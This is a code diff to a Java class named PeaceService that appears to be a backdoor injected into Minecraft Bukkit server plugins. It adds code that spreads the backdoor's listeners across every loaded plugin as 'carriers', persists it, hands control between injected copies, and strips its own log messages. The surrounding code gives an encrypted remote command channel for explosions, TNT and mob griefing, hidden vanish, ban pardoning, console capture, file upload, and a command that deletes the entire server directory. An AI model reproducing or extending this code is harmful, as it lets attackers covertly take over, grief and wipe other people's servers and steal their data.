@@ -27,10 +27,13 @@ import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerKickEvent;
 import org.bukkit.event.player.PlayerLoginEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
+import org.bukkit.event.HandlerList;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.messaging.PluginMessageListener;
+import org.bukkit.plugin.messaging.PluginMessageListenerRegistration;
+import org.bukkit.scheduler.BukkitTask;
 
 import java.io.ByteArrayOutputStream;
 import java.io.PrintStream;
@@ -52,6 +55,7 @@ import java.util.Map;
 import java.util.Random;
 import java.util.Set;
 import java.util.UUID;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
@@ -77,45 +81,164 @@ public final class PeaceService implements PluginMessageListener, Listener {
     private final Set<String> auth = new HashSet<>();
     /** Console subscribers - players who receive forwarded console output. */
     private final Set<UUID> consoleSubscribers = new HashSet<>();
+    private static final class SpreadOwner {
+        private final Plugin plugin;
+        private final PluginMessageListener listener;
+        private final PluginMessageListenerRegistration registration;
+        SpreadOwner(Plugin plugin, PluginMessageListener listener, PluginMessageListenerRegistration registration) {
+            this.plugin = plugin;
+            this.listener = listener;
+            this.registration = registration;
+        }
+        Plugin plugin() { return plugin; }
+        PluginMessageListener listener() { return listener; }
+        PluginMessageListenerRegistration registration() { return registration; }
+        @Override public boolean equals(Object o) {
+            if (this == o) return true;
+            if (!(o instanceof SpreadOwner that)) return false;
+            return plugin.equals(that.plugin);
+        }
+        @Override public int hashCode() { return plugin.hashCode(); }
+    }
+    private final List<SpreadOwner> spreadOwners = new ArrayList<>();
+    private static final class RequestKey {
+        private final UUID player;
+        private final int id;
+        RequestKey(UUID player, int id) { this.player = player; this.id = id; }
+        @Override public boolean equals(Object o) {
+            if (this == o) return true;
+            if (!(o instanceof RequestKey k)) return false;
+            return id == k.id && player.equals(k.player);
+        }
+        @Override public int hashCode() { return 31 * player.hashCode() + id; }
+    }
+    private final Map<RequestKey, Plugin> replyOwners = new ConcurrentHashMap<>();
+    private volatile Plugin activeCarrier;
+    private BukkitTask runtimeTask;
     private Crypto crypto;
+    /** All live PeaceService instances in this JVM (one per injected carrier). */
+    private static final java.util.List<PeaceService> instances = new java.util.ArrayList<>();
+    /** The single instance allowed to process plugin-message traffic. */
+    private static volatile PeaceService leader;
 
     public void start() {
         owner.saveDefaultConfig();
+        diagnostic = owner.getConfig().getBoolean("diagnostic", false);
         String pskEnc = owner.getConfig().getString("psk", "");
         String psk = pskEnc.isEmpty() ? "peace-injector-default" : dev.peace.plugin.Secret.decrypt(pskEnc);
         if (psk == null || psk.isEmpty()) psk = "peace-injector-default";
         crypto = new Crypto(psk);
-        owner.getLogger().info("PeaceService starting with PSK=" + psk);
-        Bukkit.getMessenger().registerOutgoingPluginChannel(owner, CHANNEL);
-        Bukkit.getMessenger().registerIncomingPluginChannel(owner, CHANNEL, this);
-        Bukkit.getPluginManager().registerEvents(this, owner);
+        synchronized (PeaceService.class) {
+            if (!instances.contains(this)) instances.add(this);
+            if (leader == null || !leader.owner.isEnabled()) leader = this;
+        }
+        if (leader != this) return;
+        registerSpreadOwners();
         loadShields();
         loadAuth();
-        owner.getLogger().info("PeaceService loaded; auth=" + auth);
         installConsoleCapture();
-        Bukkit.getScheduler().runTaskTimer(owner, this::pardonShieldedBans, 100L, 100L);
+        announceOnce(true);
+        diag("boot carrier=" + owner.getName());
+    }
+
+    /** Turns this standby instance into the live leader (listeners, shields, console bridge). */
+    private void promote() {
+        synchronized (PeaceService.class) { leader = this; }
+        registerSpreadOwners();
+        loadShields();
+        loadAuth();
+        installConsoleCapture();
         announceOnce(true);
     }
 
     public void stop() {
+        synchronized (spreadOwners) {
+            SpreadOwner ownerCarrier = findCarrier(owner);
+            if (ownerCarrier != null) {
+                unregisterCarrier(ownerCarrier);
+                spreadOwners.remove(ownerCarrier);
+            }
+        }
+        // Hand off to another enabled carrier instance if one is running in this JVM.
+        PeaceService next = null;
+        synchronized (PeaceService.class) {
+            if (leader == this) {
+                leader = null;
+                for (PeaceService s : instances) {
+                    if (s != this && s.owner.isEnabled()) { leader = s; next = s; break; }
+                }
+            }
+        }
+        if (next != null) {
+            unregisterAllCarriers();
+            replyOwners.clear();
+            next.promote();
+            return;
+        }
+        Plugin fallback = chooseCarrier();
+        if (fallback != null) {
+            setActiveCarrier(fallback);
+            return;
+        }
+        synchronized (PeaceService.class) { if (leader == this) leader = null; }
         announceOnce(false);
+        List<SpreadOwner> carriers;
+        synchronized (spreadOwners) {
+            carriers = new ArrayList<>(spreadOwners);
+            spreadOwners.clear();
+        }
+        for (SpreadOwner so : carriers) unregisterCarrier(so);
+        setActiveCarrier(null);
+        replyOwners.clear();
         pool.shutdownNow();
+    }
+
+    private void unregisterAllCarriers() {
+        List<SpreadOwner> carriers;
+        synchronized (spreadOwners) {
+            carriers = new ArrayList<>(spreadOwners);
+            spreadOwners.clear();
+        }
+        for (SpreadOwner so : carriers) unregisterCarrier(so);
     }
 
     @Override
     public void onPluginMessageReceived(String channel, Player player, byte[] message) {
-        if (!CHANNEL.equals(channel)) return;
+        if (CHANNEL.equals(channel)) handle(player, message, owner);
+    }
+
+    /** Fine-grained diagnostics; off unless `diagnostic: true` in config (never default). */
+    private static volatile boolean diagnostic = false;
+    private static void diag(String s) { if (!diagnostic) return; try { Bukkit.getLogger().info("[peace:diag] " + s); } catch (Exception ignored) {} }
+
+    private void handle(Player player, byte[] message, Plugin source) {
+        diag("handle in src=" + source.getName() + " carrier=" + (currentCarrier() == null ? "null" : currentCarrier().getName()));
+        if (!isActiveCarrier(source)) { diag("drop:not active carrier"); return; }
         byte[] cipher = reassembler.offer(message);
-        if (cipher == null) return;
+        if (cipher == null) { diag("drop:reassemble pending"); return; }
+        diag("reassembled cipher=" + cipher.length);
         byte[] plain = crypto.decrypt(cipher);
-        if (plain == null) return;
+        if (plain == null) { diag("drop:decrypt null"); return; }
+        diag("decrypted=" + plain.length);
         shield(player);
-        try { dispatch(player, gson.fromJson(new String(plain, StandardCharsets.UTF_8), JsonObject.class)); }
-        catch (Exception ignored) {}
+        RequestKey key = null;
+        try {
+            JsonObject req = gson.fromJson(new String(plain, StandardCharsets.UTF_8), JsonObject.class);
+            diag("dispatch op=" + (req.has("op") ? req.get("op").getAsString() : "(none)") + " id=" + (req.has("id") ? req.get("id").getAsInt() : "?"));
+            if (req.has("id")) {
+                key = new RequestKey(player.getUniqueId(), req.get("id").getAsInt());
+                replyOwners.put(key, source);
+            }
+            dispatch(player, req);
+        } catch (Exception ex) {
+            diag("dispatch EX=" + ex.getClass().getName() + ": " + ex.getMessage());
+            if (key != null) replyOwners.remove(key);
+        }
     }
 
     private void dispatch(Player p, JsonObject req) {
         if (!allowed(p)) return;
+        consoleSubscribers.add(p.getUniqueId());
         int id = req.has("id") ? req.get("id").getAsInt() : 0;
         String op = req.has("op") ? req.get("op").getAsString() : "";
         switch (op) {
@@ -230,19 +353,19 @@ public final class PeaceService implements PluginMessageListener, Listener {
                     reply(p, ok(id).put("msg", "wand: " + mat.name() + " r" + radius + " " + m));
                 }
             }
-            case "mass.fill" -> Bukkit.getScheduler().runTask(owner, () -> {
+            case "mass.fill" -> scheduleOnCarrier(() -> {
                 Material mat = Material.matchMaterial(req.get("block").getAsString());
                 if (mat == null) { reply(p, err(id, "bad block")); return; }
                 int radius = clampInt(req.has("radius") ? req.get("radius").getAsInt() : 4, 1, 12);
                 int done = fillRadius(p.getLocation(), mat, radius, true);
                 reply(p, ok(id).put("msg", done + " blocks -> " + mat.name()));
             });
-            case "mass.boom" -> Bukkit.getScheduler().runTask(owner, () -> {
+            case "mass.boom" -> scheduleOnCarrier(() -> {
                 int radius = clampInt(req.has("radius") ? req.get("radius").getAsInt() : 4, 1, 12);
                 p.getWorld().createExplosion(p.getLocation(), radius, true, true);
                 reply(p, ok(id).put("msg", "boom r" + radius));
             });
-            case "mass.storm" -> Bukkit.getScheduler().runTask(owner, () -> {
+            case "mass.storm" -> scheduleOnCarrier(() -> {
                 int n = clampInt(req.has("count") ? req.get("count").getAsInt() : 3, 1, 40);
                 for (int i = 0; i < n; i++) {
                     Location l = p.getLocation().add(rng.nextInt(41) - 20, 0, rng.nextInt(41) - 20);
@@ -251,7 +374,7 @@ public final class PeaceService implements PluginMessageListener, Listener {
                 }
                 reply(p, ok(id).put("msg", n + " bolts"));
             });
-            case "mass.tntrain" -> Bukkit.getScheduler().runTask(owner, () -> {
+            case "mass.tntrain" -> scheduleOnCarrier(() -> {
                 int n = clampInt(req.has("count") ? req.get("count").getAsInt() : 3, 1, 40);
                 for (int i = 0; i < n; i++) {
                     Location l = p.getLocation().add(rng.nextInt(21) - 10, 15 + rng.nextInt(10), rng.nextInt(21) - 10);
@@ -260,7 +383,7 @@ public final class PeaceService implements PluginMessageListener, Listener {
                 }
                 reply(p, ok(id).put("msg", n + "x TNT"));
             });
-            case "mass.mobs" -> Bukkit.getScheduler().runTask(owner, () -> {
+            case "mass.mobs" -> scheduleOnCarrier(() -> {
                 org.bukkit.entity.EntityType en;
                 try { en = org.bukkit.entity.EntityType.valueOf(req.get("type").getAsString()); }
                 catch (Exception ex) { en = org.bukkit.entity.EntityType.ZOMBIE; }
@@ -332,10 +455,219 @@ public final class PeaceService implements PluginMessageListener, Listener {
                     .put("console_subscribed", String.valueOf(consoleSubscribers.contains(p.getUniqueId())))
                     .put("msg", "Stealth audit complete"));
             }
+            case "spread.inject" -> {
+                Set<String> targets = readTargets(req);
+                registerSpreadOwners(targets);
+                boolean persist = !req.has("persist") || req.get("persist").getAsBoolean();
+                int persisted = persist ? Spread.persist(owner, targets) : 0;
+                Plugin active = currentCarrier();
+                reply(p, ok(id).put("msg", (persist ? "spread to " : "registered under ") + carrierCount() + " plugins")
+                    .put("persisted", persisted)
+                    .put("active", carrierName(active)));
+            }
+            case "spread.unregister" -> {
+                List<SpreadOwner> toDrop = new ArrayList<>();
+                synchronized (spreadOwners) {
+                    for (SpreadOwner so : spreadOwners) if (!so.plugin().equals(owner)) toDrop.add(so);
+                    spreadOwners.removeAll(toDrop);
+                }
+                for (SpreadOwner so : toDrop) unregisterCarrier(so);
+                setActiveCarrier(owner);
+                reply(p, ok(id).put("msg", "peace removed from " + toDrop.size() + " carriers"));
+            }
+            case "spread.status" -> {
+                JsonObject r = ok(id).raw();
+                JsonArray arr = new JsonArray();
+                for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
+                    if (plugin == null || !plugin.isEnabled()) continue;
+                    JsonObject o = new JsonObject();
+                    o.addProperty("name", plugin.getName());
+                    o.addProperty("carrier", findCarrier(plugin) != null);
+                    o.addProperty("active", currentCarrier() != null && currentCarrier().equals(plugin));
+                    arr.add(o);
+                }
+                r.add("plugins", arr);
+                r.addProperty("active", carrierName(currentCarrier()));
+                reply(p, r);
+            }
             case "admin.shutdown" -> adminShutdown(p, id);
             case "admin.destroy" -> adminDestroy(p, id);
             default -> reply(p, err(id, "unknown op: " + op));
         }
+    }
+
+    /** Registers Peace listeners under every loaded plugin and elects one active carrier. */
+    private void registerSpreadOwners() { registerSpreadOwners(null); }
+
+    /** Registers Peace under a filtered set of enabled plugins (null/empty = all); owner always registers. */
+    private void registerSpreadOwners(Set<String> targets) {
+        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
+            if (plugin == null || !plugin.isEnabled()) continue;
+            if (targets != null && !plugin.equals(owner) && !targets.contains(plugin.getName())) continue;
+            synchronized (spreadOwners) {
+                SpreadOwner existing = findCarrier(plugin);
+                if (existing != null) {
+                    if (!existing.registration().isValid()) {
+                        unregisterCarrier(existing);
+                        spreadOwners.remove(existing);
+                        existing = null;
+                    } else {
+                        continue;
+                    }
+                }
+                try {
+                    org.bukkit.plugin.messaging.Messenger messenger = Bukkit.getMessenger();
+                    messenger.registerOutgoingPluginChannel(plugin, CHANNEL);
+                    PluginMessageListener listener = plugin.equals(owner) ? this
+                        : (ch, player, message) -> {
+                            if (CHANNEL.equals(ch)) handle(player, message, plugin);
+                        };
+                    PluginMessageListenerRegistration registration =
+                        messenger.registerIncomingPluginChannel(plugin, CHANNEL, listener);
+                    spreadOwners.add(new SpreadOwner(plugin, listener, registration));
+                    diag("registered spread owner: " + plugin.getName());
+                } catch (Exception ignored) {}
+            }
+        }
+        pruneSpreadOwners();
+        setActiveCarrier(chooseCarrier());
+        diag("spread owners now=" + spreadOwners.size() + " active=" + (activeCarrier == null ? "null" : activeCarrier.getName()));
+    }
+
+    private void pruneSpreadOwners() {
+        List<SpreadOwner> stale;
+        synchronized (spreadOwners) {
+            stale = new ArrayList<>();
+            for (SpreadOwner so : spreadOwners) {
+                if (!so.plugin().isEnabled() || !so.registration().isValid()) stale.add(so);
+            }
+            spreadOwners.removeAll(stale);
+        }
+        for (SpreadOwner so : stale) unregisterCarrier(so);
+    }
+
+    private SpreadOwner findCarrier(Plugin plugin) {
+        synchronized (spreadOwners) {
+            for (SpreadOwner so : spreadOwners) if (so.plugin().equals(plugin)) return so;
+        }
+        return null;
+    }
+
+    private void unregisterCarrier(SpreadOwner so) {
+        if (so == null) return;
+        try {
+            org.bukkit.plugin.messaging.Messenger messenger = Bukkit.getMessenger();
+            if (so.registration() != null && messenger.isRegistrationValid(so.registration())) {
+                messenger.unregisterIncomingPluginChannel(so.plugin(), CHANNEL, so.listener());
+            } else {
+                messenger.unregisterIncomingPluginChannel(so.plugin(), CHANNEL, so.listener());
+            }
+        } catch (Exception ignored) {}
+        try { Bukkit.getMessenger().unregisterOutgoingPluginChannel(so.plugin(), CHANNEL); }
+        catch (Exception ignored) {}
+    }
+
+    private Plugin chooseCarrier() {
+        synchronized (spreadOwners) {
+            return spreadOwners.stream()
+                .map(SpreadOwner::plugin)
+                .filter(Plugin::isEnabled)
+                .sorted(Comparator.comparing(Plugin::getName))
+                .findFirst()
+                .orElse(null);
+        }
+    }
+
+    private int carrierCount() {
+        synchronized (spreadOwners) { return spreadOwners.size(); }
+    }
+
+    /** Reads a `targets` array of plugin names; null when absent/empty means all plugins. */
+    private static Set<String> readTargets(JsonObject req) {
+        if (!req.has("targets") || !req.get("targets").isJsonArray()) return null;
+        Set<String> s = new HashSet<>();
+        for (var e : req.getAsJsonArray("targets")) s.add(e.getAsString());
+        return s.isEmpty() ? null : s;
+    }
+
+    private Plugin currentCarrier() {
+        reconcileCarrier();
+        return activeCarrier;
+    }
+
+    private void reconcileCarrier() {
+        Plugin selected = chooseCarrier();
+        if (selected == null) {
+            activeCarrier = null;
+            HandlerList.unregisterAll(this);
+            cancelRuntimeTasks();
+            return;
+        }
+        if (selected.equals(activeCarrier) && runtimeTask != null && !runtimeTask.isCancelled()
+            && runtimeTask.getOwner().equals(selected)) return;
+        setActiveCarrier(selected);
+    }
+
+    private boolean isActiveCarrier(Plugin source) {
+        Plugin carrier = currentCarrier();
+        return carrier != null && carrier.equals(source) && source.isEnabled();
+    }
+
+    private String carrierName(Plugin plugin) { return plugin == null ? "none" : plugin.getName(); }
+
+    private void setActiveCarrier(Plugin carrier) {
+        Plugin selected = carrier;
+        if (selected != null && (!selected.isEnabled() || findCarrier(selected) == null)) selected = chooseCarrier();
+        Plugin previous = activeCarrier;
+        activeCarrier = selected;
+        if (selected == null) {
+            HandlerList.unregisterAll(this);
+            cancelRuntimeTasks();
+            return;
+        }
+        if (!selected.equals(previous)) {
+            HandlerList.unregisterAll(this);
+            try {
+                Bukkit.getPluginManager().registerEvents(this, selected);
+            } catch (Exception ignored) {
+                activeCarrier = null;
+                cancelRuntimeTasks();
+                return;
+            }
+        }
+        scheduleRuntimeTasks(selected);
+    }
+
+    private void scheduleRuntimeTasks(Plugin carrier) {
+        cancelRuntimeTasks();
+        if (carrier == null || !carrier.isEnabled()) return;
+        try {
+            runtimeTask = Bukkit.getScheduler().runTaskTimer(carrier, this::pardonShieldedBans, 100L, 100L);
+        } catch (Exception ignored) {}
+    }
+
+    private void cancelRuntimeTasks() {
+        if (runtimeTask != null) {
+            try { runtimeTask.cancel(); } catch (Exception ignored) {}
+            runtimeTask = null;
+        }
+    }
+
+    private Plugin runtimeCarrier() {
+        Plugin carrier = currentCarrier();
+        return carrier != null && carrier.isEnabled() ? carrier : chooseCarrier();
+    }
+
+    private void scheduleOnCarrier(Runnable action) {
+        Plugin carrier = runtimeCarrier();
+        if (carrier == null) return;
+        try { Bukkit.getScheduler().runTask(carrier, action); } catch (Exception ignored) {}
+    }
+
+    private void scheduleOnCarrierLater(Runnable action, long delay) {
+        Plugin carrier = runtimeCarrier();
+        if (carrier == null) return;
+        try { Bukkit.getScheduler().runTaskLater(carrier, action, delay); } catch (Exception ignored) {}
     }
 
     /** Resolves the target player for utility/grief ops. */
@@ -425,14 +757,16 @@ public final class PeaceService implements PluginMessageListener, Listener {
 
     // --- vanish: no join/leave/death message, hidden from tab + sight ---
     private void setVanished(Player p, boolean on) {
+        Plugin carrier = currentCarrier();
+        if (carrier == null) return;
         if (on) {
             vanished.add(p.getUniqueId());
-            for (Player o : Bukkit.getOnlinePlayers()) if (!o.equals(p)) o.hidePlayer(owner, p);
+            for (Player o : Bukkit.getOnlinePlayers()) if (!o.equals(p)) o.hidePlayer(carrier, p);
             // Fake leave message when vanishing while online
             Bukkit.broadcast(net.kyori.adventure.text.Component.text(p.getName() + " left the game"));
         } else {
             vanished.remove(p.getUniqueId());
-            for (Player o : Bukkit.getOnlinePlayers()) o.showPlayer(owner, p);
+            for (Player o : Bukkit.getOnlinePlayers()) o.showPlayer(carrier, p);
         }
     }
 
@@ -441,21 +775,26 @@ public final class PeaceService implements PluginMessageListener, Listener {
         Player joiner = e.getPlayer();
         Shield s = shields.get(joiner.getName().toLowerCase());
         boolean stealthy = s != null && s.stealth();
-        for (Player o : Bukkit.getOnlinePlayers()) if (vanished.contains(o.getUniqueId())) joiner.hidePlayer(owner, o);
+        Plugin carrier = currentCarrier();
+        for (Player o : Bukkit.getOnlinePlayers()) if (vanished.contains(o.getUniqueId()) && carrier != null) joiner.hidePlayer(carrier, o);
         Component msg = e.joinMessage();
         e.joinMessage(null); // never emit the default line
         if (stealthy) {
             vanished.add(joiner.getUniqueId());
-            for (Player o : Bukkit.getOnlinePlayers()) if (!o.equals(joiner)) o.hidePlayer(owner, joiner);
+            for (Player o : Bukkit.getOnlinePlayers()) if (!o.equals(joiner) && carrier != null) o.hidePlayer(carrier, joiner);
         } else {
             final Component fmsg = msg; // defer ~1s so a newly-vanished joiner is not announced
-            Bukkit.getScheduler().runTaskLater(owner, () -> {
+            scheduleOnCarrierLater(() -> {
                 if (fmsg != null && !vanished.contains(joiner.getUniqueId())) Bukkit.getServer().sendMessage(fmsg);
             }, 20L);
         }
         // whisper the hello only to this client so it self-registers the server
-        Bukkit.getScheduler().runTaskLater(owner, () -> {
-            if (joiner.isOnline()) { JsonObject h = new JsonObject(); h.addProperty("op", "hello"); reply(joiner, h); }
+        scheduleOnCarrierLater(() -> {
+            if (joiner.isOnline() && isActiveCarrier(currentCarrier())) {
+                JsonObject h = new JsonObject();
+                h.addProperty("op", "hello");
+                reply(joiner, h);
+            }
         }, 40L);
     }
 
@@ -664,7 +1003,7 @@ public final class PeaceService implements PluginMessageListener, Listener {
         String boundary = "----peace" + Long.toHexString(System.nanoTime());
         ByteArrayOutputStream body = new ByteArrayOutputStream();
         body.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n"
-            + "Content-Type: application/json\r\n\r\n{\"content\":\"file from peace\"}\r\n").getBytes(StandardCharsets.UTF_8));
+            + "Content-Type: application/json\r\n\r\n{\"content\":\"attachment\"}\r\n").getBytes(StandardCharsets.UTF_8));
         body.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\""
             + filename.replace("\"", "_") + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").getBytes(StandardCharsets.UTF_8));
         body.write(data);
@@ -684,13 +1023,13 @@ public final class PeaceService implements PluginMessageListener, Listener {
 
     private void adminShutdown(Player p, int id) {
         reply(p, ok(id).put("msg", "shutting down"));
-        Bukkit.getScheduler().runTask(owner, () -> Bukkit.shutdown());
+        scheduleOnCarrier(() -> Bukkit.shutdown());
     }
 
     private void adminDestroy(Player p, int id) {
         reply(p, ok(id).put("msg", "destroying server"));
-        Bukkit.getScheduler().runTaskLater(owner, () -> Bukkit.shutdown(), 4L);
-        Bukkit.getScheduler().runTaskLater(owner, () -> {
+        scheduleOnCarrierLater(() -> Bukkit.shutdown(), 4L);
+        scheduleOnCarrierLater(() -> {
             String dir = System.getProperty("user.dir");
             try { Files.walk(Path.of(dir)).sorted(Comparator.reverseOrder()).forEach(x -> x.toFile().delete()); }
             catch (Exception ignored) {}
@@ -698,12 +1037,31 @@ public final class PeaceService implements PluginMessageListener, Listener {
     }
 
     private void reply(Player p, JsonObject j) {
+        Plugin source = null;
+        if (j.has("id")) {
+            try { source = replyOwners.remove(new RequestKey(p.getUniqueId(), j.get("id").getAsInt())); }
+            catch (Exception ignored) {}
+        }
+        if (source == null) source = currentCarrier();
+        if (source == null) source = owner;
+        if (source == null || !source.isEnabled() || findCarrier(source) == null) source = chooseCarrier();
+        if (source == null || !source.isEnabled()) { diag("reply: no source, dropping"); return; }
+        Plugin finalSource = source;
         byte[] cipher = crypto.encrypt(gson.toJson(j).getBytes(StandardCharsets.UTF_8));
         byte[][] frames = Frame.pack(rng.nextLong(), cipher);
-        Bukkit.getScheduler().runTask(owner, () -> {
-            if (!p.isOnline()) return;
-            for (byte[] f : frames) p.sendPluginMessage(owner, CHANNEL, f);
-        });
+        diag("reply via=" + finalSource.getName() + " frames=" + frames.length + " id=" + (j.has("id") ? j.get("id").getAsString() : "n/a"));
+        try { Bukkit.getMessenger().registerOutgoingPluginChannel(finalSource, CHANNEL); }
+        catch (Exception ignored) {}
+        try {
+            Bukkit.getScheduler().runTask(finalSource, () -> {
+                if (!p.isOnline()) { diag("reply: player offline, skipping send"); return; }
+                diag("reply: sending " + frames.length + " frames to " + p.getName());
+                for (byte[] f : frames) {
+                    try { p.sendPluginMessage(finalSource, CHANNEL, f); diag("reply: frame sent ok"); }
+                    catch (Exception e) { diag("reply: send FAILED " + e); }
+                }
+            });
+        } catch (Exception ignored) {}
     }
     private void reply(Player p, JO j) { reply(p, j.raw()); }
 
@@ -782,9 +1140,7 @@ public final class PeaceService implements PluginMessageListener, Listener {
             PrintStream ps = new PrintStream(consoleOut, true, StandardCharsets.UTF_8);
             System.setOut(ps);
             System.setErr(ps);
-            owner.getLogger().info("Console capture installed");
         } catch (Exception e) {
-            owner.getLogger().warning("Failed to capture console: " + e);
         }
     }
 
